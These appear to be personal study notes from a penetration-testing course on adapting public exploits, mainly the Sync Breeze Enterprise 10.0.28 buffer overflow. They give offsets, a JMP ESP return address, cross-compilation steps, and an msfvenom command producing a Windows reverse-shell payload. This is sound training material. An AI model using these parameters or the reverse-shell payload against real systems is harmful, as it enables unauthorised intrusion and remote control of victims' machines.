Fixing Exploits

compromise is to modify a public exploit to suit our needs

challenges: buffer overflow, need to modify basic target parameters such as the socket information, return address, payload and offsets

before running the pentest scope needs to be defined upfront, the client needs to understand that downtime to prod may happen

always read the exploit code carefully mod as needed and test it aginst own sandboxed target whenever possible


Fixing Memory Corruption Exploits

Buffer is a memory area intended to hold content that is sent by the user for later processing

buffer overflows are one of the earliest memory corruption vulnerabilities 

buffer overflow occurs when the user's provided content goes beyond the stack limit and overruns into the adjacent memory area

memory corruption can occur in heap or the stack, heap is dynamically managed and typically stores large chunks of globally accessible data, stack is to store local function data and has a fixed size

stack contains int or buffers

*buffer[64]*
strcpy (buffer, argv[1]); 

the above does not check if the destination address can handel the originating string

input validation but low level

the stack makes room for the exact space needed by the buffer, along with function parameters and the return address

return address is a memory address that stores the next function to be exe once the running has completed

if user input is bigger than destination buffer space, it could overwite the return address

rewriting the return address: 
when function ends, ret is called, which loads the return address inside EIP/RIP, the instruction pointer responsible for keeping track of current code instructions

we can eventrually control the program flow if we control return address

we can rewrite the return address with a valid and mapped memory address containing shellcode 

development of ASLR and Executable Space Protection among others


Flow of standard stack-based buffer overflow:
Create a large buffer to trigger the overflow
Take control of EIP by overwriting a return address on the stack, padding the large buffer with appropriate offset
Include payload in buffer prepended by NOP sled
Choose a correct return address instruction such as JMP ESP to redirect the execution flow to payload

ASCII or UNICODE bad characters will break application when included in the payload because they might be interpreted as control characters


Impoprting and Examining the Exploit

target Sync Breeze Enterprise 10.0.28 42341.c

vulnerability is present in the HTTP server module where a buffer overflow condition is triggered by POST request

basically:

offset = "A" * 780
JMP_ESP = "\x83\x0c\x09\x10"
shellcode = "x90"*16 + msf_shellcode
exploit = offset + JMP_ESP + shellcode

offset overwrites the instruction pointer with JMP ESP instruction located at 0x10090c83

we append shell code with 16 NOPs

Python vs C

scripting languages are executed through an interpreter and not complied to create standalone exe, so we can't run python when python is not installed

concatenating a string is very easy and usually takes the addtion of 2 var


we move the target exploit to working directory 
searchsploit -m <exploitdb id>

notice headers such as 
winsock2.h
incidcating tha the code was meant to be compiled on win

we will cross-compile with kali


Cross-compiling Exploit Code

we'll use mingw-64 cross-compiler

i686-w64-mingw32-gcc <.c file>.c -o <name>.exe

research the error

fixed new command:
i686-w64-mingw32-gcc <.c file>.c -o <name>.exe -lws2_32

using wine before c file to run


Fixing the Exploit

in the c code // msvbvm60.dll was commented

which is not a part of the vulnerable software, examining the loaded modules in the debugger on windows we note that this dll is missing, which means the return address is wrong

to verify: start the service on the client, launch Immunity Debugger as admin 
File>Attach and select the process

once attached we can click on the View menu, then Executable modules
from here we can verify if the dll is present

given the python version is marked as EDB verified so we can just replace the target return address with the one contained in that version

if we don't have a return address from a previously developed exploit: 
recreate the target environment locally and used the debugger to determine address

we could use information from other public exploits to find a reliable return address that will match out target environment

for example:
if we needed a JMP ESP instruction for Win server 2019 we could search for it in public exploits leverageing different vulnerabilities targeting hat os

during normal buffer overfloww we shouldn't rely on hard coded JMP ESP as  these are randomized at boot time due to ASLR, we need to find these in non ASLR modules

we could also obtain the address directly from the machine, if we have access as an unprivileged user, we can copy the DLL we are intrested in onto our attacker and use objdump

we should generate our own payload with msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=<my ip> LPORT=4444 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"


on immunity debugger we can test the exploit

ctrl+G follow the JMP ESP address and press f2 to set a breakpoint

use wine with sudo wine <app>.exe


Changing the Overflow Buffer

looking at the example PoC code:

int initial_buffer_size = 780;
char *padding = malloc (initial_buffer_size);

780 is the offset in bytes required to overwrite the return address on the stack

malloc only acclocates memory, buffer still needs to be properly inied

memset(padding, 0x41, initial_buffer_size);
memset fills the memory with A to the pointer, of the initial_buffer_size

next line:
memset(padding + initial_buffer_size - 1, 0x00, 1);
this is done as C's string has a null terminator and the rest of the script is done in str functions


Fixing web exploits

Does it initiate HTTP or HTTPS
Does it access specific web app path
Does the exploit need pre authentication
How does the app exploit 
How are GET or POST requests craftedd?
Does it rely on default app setting?
Will oddities such as self signed certs disrupt exploit

use the verify=Flase to ignore SSL certificates

Index out of range

looking at the error thrown by the interpreter:
line 24: split method

we need to incestigate the documentation of split

method slices the input string using an optional separator passed as first argument

if the error isn't evident use print

dirbuster is an alternative to gobuster, should try, wordlist is located at: 
/usr/share/wordlists/dirbuster/
a lot more substantial 